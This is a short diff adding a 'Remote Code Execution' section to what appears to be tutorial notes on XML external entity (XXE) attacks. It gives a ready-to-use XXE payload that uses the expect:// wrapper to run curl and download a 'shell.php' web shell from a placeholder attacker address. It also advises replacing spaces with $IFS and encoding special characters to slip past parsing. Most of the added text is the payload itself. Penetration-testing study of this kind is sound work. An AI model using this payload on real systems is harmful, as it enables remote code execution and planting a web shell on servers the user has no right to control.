@@ -69,3 +69,17 @@ In this case we need to be careful because if we are referencing something that 
 
 <img width="1536" height="317" alt="image" src="https://github.com/user-attachments/assets/2e968743-a66a-47fe-9bf6-d90f03c2a9ca" />
 
+### 4) Remote Code Execution
+
+In this case we need to be careful with special characters (| < > { } &) as well, as they will break our command, you could even consider encode them. For case see that in example below we replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax.
+
+        <?xml version="1.0"?>
+        <!DOCTYPE email [
+          <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+        ]>
+        <root>
+        <name></name>
+        <tel></tel>
+        <email>&company;</email>
+        <message></message>
+        </root>
